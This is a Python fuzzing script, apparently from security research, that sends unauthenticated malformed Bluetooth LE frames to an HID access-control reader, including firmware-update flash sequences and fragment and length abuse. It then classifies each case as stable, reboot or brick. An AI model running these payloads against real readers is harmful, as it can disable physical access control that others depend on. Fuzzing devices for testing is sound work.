#!/usr/bin/env python3
"""Systematic unauthenticated crash-hunting across the reader's BLE surfaces.

For each candidate we use a FRESH connection (isolation + avoids state
contamination), send the payload, record the reader's reply, then watch for a
crash signal: a reboot (reader stops advertising >3s then returns), a link-drop
mid-exchange, a brick (stays dark), or clean stability.

Crash = reader stops advertising for a gap. We classify each candidate and
continue hunting. Reader health is re-checked before every case.

Surfaces covered (all unauthenticated, no tunnel / credential / SNMP):
  A. Extension frame types 0xE0-0xFF (msg_type 0-31), small + large payloads
  B. FW_UPDATE (0xE2) deeper opcodes + multi-frame flash sequences
  C. 0xE1 (EOT) frames sent central->reader
  D. Fragment-reassembly abuse (len/CRC/split/mid-APDU)
  E. Malformed / huge / recursive FCI replies to SELECT_ADF

Usage: python3 tools/crash_hunt.py <MAC> [--only A,B,C,D,E] [--max-cases N] [-v]
"""
import argparse
import asyncio
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from hid_rm import DATA_CHAR_UUID, framing, seos
from hid_rm import tunnel as tun

MAC_DEFAULT = "C0:60:33:15:2B:31"
REBOOT_GAP_S = 3.0          # dark longer than this == reboot signal
DARK_UP_TO_S = 90.0         # how long to wait for the reader to come back


async def present(mac: str, timeout: float = 3.0) -> bool:
    from bleak import BleakScanner
    return mac in await BleakScanner.discover(timeout=timeout)


async def ensure_up(mac: str, verbose: bool) -> bool:
    if await present(mac):
        return True
    if verbose:
        print("    (reader dark -- waiting ...) ...", flush=True)
    t0 = time.monotonic()
    while time.monotonic() - t0 < DARK_UP_TO_S:
        await asyncio.sleep(1.0)
        if await present(mac):
            return True
    return await present(mac)


async def observe_reboot(mac: str) -> dict:
    """After a candidate, classify: REBOOT / LINK-DROP / BRICK / STABLE.

    Returns {verdict, dark_s, reappeared}."""
    t0 = time.monotonic()
    first_dark_at = None
    while time.monotonic() - t0 < DARK_UP_TO_S:
        if await present(mac):
            if first_dark_at is None:
                # never went dark -> stable
                return {"verdict": "STABLE", "dark_s": 0.0, "reappeared": True}
            gap = time.monotonic() - first_dark_at
            return {"verdict": "REBOOT", "dark_s": gap, "reappeared": True}
        # reader is dark now
        if first_dark_at is None:
            # only start the dark timer after a brief grace (link settle)
            if time.monotonic() - t0 >= REBOOT_GAP_S:
                first_dark_at = time.monotonic()
        await asyncio.sleep(1.0)
    # timed out dark
    if first_dark_at is not None:
        return {"verdict": "BRICK?", "dark_s": time.monotonic() - first_dark_at, "reappeared": False}
    return {"verdict": "STABLE", "dark_s": 0.0, "reappeared": True}


async def probe(mac: str, name: str, frames: list, verbose: bool) -> dict:
    """One candidate: fresh connection, send frames in order, read replies."""
    from bleak import BleakClient
    res = {"case": name, "reply": "", "write_fail": False, "link_down": False}
    c = BleakClient(mac)
    try:
        await c.connect()
        rx = []
        await c.start_notify(DATA_CHAR_UUID, lambda _, d: rx.append(bytes(d)))
        await asyncio.sleep(1.8)      # spontaneous SELECT
        rx.clear()
        for i, f in enumerate(frames):
            try:
                await c.write_gatt_char(DATA_CHAR_UUID, f, response=False)
            except Exception as e:
                res["write_fail"] = True
                res["reply"] += f"[write#{i} FAIL:{type(e).__name__}] "
                res["link_down"] = True
                break
            await asyncio.sleep(1.5)
            if rx:
                res["reply"] += ",".join(seos.describe(x) for x in rx) + " | "
                rx.clear()
            if not c.is_connected:
                res["link_down"] = True
                res["reply"] += "[link-down] "
                break
    except Exception as e:
        res["reply"] += f"[exc:{type(e).__name__}] "
    finally:
        try:
            await c.disconnect()
        except Exception:
            pass
    res["crash"] = await observe_reboot(mac)
    return res


# ---------------------------------------------------------------------------
# Candidate builders
# ---------------------------------------------------------------------------

def candidates() -> list:
    C = []
    # A. Extension frame type sweep (msg_type 0-31), two payload shapes.
    for mt in range(32):
        C.append((f"A: ext 0x{0xE0|mt:02X} + 84 00",
                  [seos.ext_frame(mt, bytes.fromhex("8400"))]))
    for mt in range(32):
        C.append((f"A: ext 0x{0xE0|mt:02X} + 16B",
                  [seos.ext_frame(mt, bytes(range(16)))]))

    # B. FW_UPDATE (0xE2) deeper opcodes + multi-frame.
    for op in [0x85, 0x86, 0x87, 0x88, 0x8C, 0x8D, 0x8E, 0x8F]:
        C.append((f"B: 0xE2 op {op:02X}", [seos.ext_frame(2, bytes([op, 0]))]))
    C.append(("B: 0xE2 INIT_FLASH + ACK",
              [seos.ext_frame(2, seos.REQUEST_INIT_FLASH),
               seos.ext_frame(2, seos.REQUEST_INIT_FLASH_ACK)]))
    C.append(("B: 0xE2 INIT_FLASH + 8B data",
              [seos.ext_frame(2, seos.REQUEST_INIT_FLASH),
               seos.ext_frame(2, bytes.fromhex("0001020304050607"))]))
    C.append(("B: 0xE2 INIT_FLASH x3",
              [seos.ext_frame(2, seos.REQUEST_INIT_FLASH)] * 3))
    C.append(("B: 0xE2 255B payload", [seos.ext_frame(2, bytes(255))]))

    # C. 0xE1 (EOT) sent central->reader.
    for st in [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0, 0xFF]:
        C.append((f"C: 0xE1 EOT status={st}", [bytes([0xE1, st])]))
    C.append(("C: 0xE1 EOT 8B", [bytes([0xE1, 1]) + bytes(8)]))

    # D. Fragment-reassembly abuse.
    C.append(("D: 1B junk", [b"\x00"]))
    C.append(("D: 0x40 poll only", [bytes([0x40])]))
    C.append(("D: bad-len 0x42 80 + 8B", [bytes([0x42, 0x80]) + bytes(8)]))
    C.append(("D: bad-len 0x42 01 + 1B", [bytes([0x42, 0x01, 0xAA])]))
    C.append(("D: no-CRC 0x40 80 + 1B + noCRC", [bytes([0x40, 0x80, 0xAA])]))
    C.append(("D: double 0x40 80", [bytes([0x40, 0x80, 0xAA]), bytes([0x40, 0x80, 0xBB])]))
    C.append(("D: 300B single write", [bytes([0x40, 0x80]) + bytes(298)]))

    # E. Malformed FCI to the reader's SELECT_ADF.
    C.append(("E: FCI len=255 + 255B", [bytes([0x40, 0xFF]) + bytes(255)]))
    C.append(("E: FCI len=1 + 1B", [bytes([0x40, 0x01, 0x90])]))
    C.append(("E: FCI len=0", [bytes([0x40, 0x00])]))
    C.append(("E: FCI 0x40 90 00 61 FF", [bytes([0x40, 0x90, 0x00, 0x61, 0xFF])]))
    C.append(("E: FCI recursive TLV", [bytes([0x40, 0x10]) + bytes([0x90, 0x00]) + bytes([0x80, 0x10]) + bytes(14)]))
    return C


async def main(mac: str, only, max_cases, verbose):
    sys.stdout.reconfigure(line_buffering=True)
    all_c = candidates()
    sel = [c for c in all_c if (only is None or c[0][0] in only)]
    if max_cases:
        sel = sel[:max_cases]
    print(f"== crash hunt: {mac}  ({len(sel)} cases) ==", flush=True)

    for name, frames in sel:
        if not await ensure_up(mac, verbose):
            print(f"\n  [skip {name} -- reader dark past wait]", flush=True)
            break
        r = await probe(mac, name, frames, verbose)
        cr = r["crash"]
        verdict = cr["verdict"]
        mark = {
            "REBOOT": "** REBOOT **",
            "BRICK?": "*** BRICK? (still dark) ***",
            "STABLE": "stable",
        }.get(verdict, verdict)
        extra = []
        if r["write_fail"]:
            extra.append("WRITE-FAIL")
        if r["link_down"]:
            extra.append("link-down")
        print(f"\n  {name}", flush=True)
        print(f"    reply: {r['reply'][:100] or '(none)'}", flush=True)
        print(f"    crash: {mark}  dark={cr['dark_s']:.1f}s reappeared={cr['reappeared']}  {(' '.join(extra))}", flush=True)
        if verdict == "BRICK?":
            print("\n  [reader dark past wait -- stopping to inspect]", flush=True)
            break
        await asyncio.sleep(1.5)

    print("\n== done ==", flush=True)
    print("final present:", await present(mac), flush=True)


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("mac", nargs="?", default=MAC_DEFAULT)
    ap.add_argument("--only", help="comma list of group letters A,B,C,D,E")
    ap.add_argument("--max-cases", type=int, default=0)
    ap.add_argument("-v", "--verbose", action="store_true")
    args = ap.parse_args()
    only = set(args.only.split(",")) if args.only else None
    asyncio.run(main(args.mac, only, args.max_cases, args.verbose))
